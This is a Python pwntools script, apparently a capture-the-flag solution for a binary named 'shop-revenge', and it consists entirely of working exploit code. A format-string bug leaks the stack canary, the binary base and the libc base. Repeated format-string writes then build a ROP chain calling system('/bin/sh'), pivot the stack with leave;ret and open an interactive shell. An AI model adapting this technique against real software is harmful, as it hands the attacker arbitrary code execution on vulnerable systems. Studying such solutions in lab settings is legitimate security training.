#!/usr/bin/env python3

from pwn import *

exe = ELF("./shop-revenge")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
io = gdb.debug([ld.path, exe.path], env={"LD_PRELOAD": libc.path}, gdbscript='''
    # 在 printf 之后停下
    b *get_input+167
    continue
''')

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote('localhost', 1337)

    return r


def main():
    r = conn()
    r.recvuntil("exit\n")
    payload = b"A" * 8 + b" "
    payload += b"%p, " * 90
    r.sendline(payload)
    r.recvline()
    
    line = r.recvline().decode("utf-8")
    print(line)
    canary = int(line.split(", ")[40], 16)

    main_addr = int(line.split(", ")[48], 16)
    io_stderr_leak = int(line.split(", ")[45], 16)
    leak_stack = int(line.split(", ")[41], 16)
    exe.address = main_addr - exe.symbols["main"]
    libc.address = io_stderr_leak - libc.symbols["_IO_2_1_stderr_"]
    abc =  io_stderr_leak - libc.address

    log.success(f"main_addr address: {hex(main_addr)}")
    log.success(f"io_stderr_leak address: {hex(io_stderr_leak)}")

    log.success(f"abc address: {hex(abc)}")


    log.success(f"base address calculated: {hex(exe.address)}")
    log.success(f"libc address: {hex(libc.address)}")
    log.success(f"stack leak: {hex(leak_stack)}")
    log.info(f"ret address: {hex(leak_stack - 8)}")
    rop = ROP(libc)
    rop2 = ROP(exe)
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    ret = rop2.find_gadget(["ret"])[0]
    leave_ret = rop2.find_gadget(["leave", "ret"])[0]
    ret_addr = leak_stack - 8
    chain_addr = leak_stack + 0x200 # Address of our rop chain
    log.success(f"chain address, bss: {hex(chain_addr)} {hex(exe.bss())}")

    fmt = fmtstr_payload(8, {
        chain_addr : 0,
        chain_addr + 8: pop_rdi,
        chain_addr + 16: pop_rdi,
        }, write_size="short")
    r.clean()
    r.sendline(fmt)
    
    fmt = fmtstr_payload(8, {
        chain_addr + 24: pop_rdi,
        chain_addr + 32: next(libc.search("/bin/sh")),
        chain_addr + 40: ret,
        chain_addr + 48: libc.symbols["system"]
        }, write_size="short")
    r.clean()
    r.sendline(fmt)
    
    fmt = fmtstr_payload(8,{
        ret_addr - 8: chain_addr,
        ret_addr: leave_ret,
        }, write_size='short')
    r.clean()
    pause()
    r.sendline(fmt)
    r.interactive()


if __name__ == "__main__":
    main()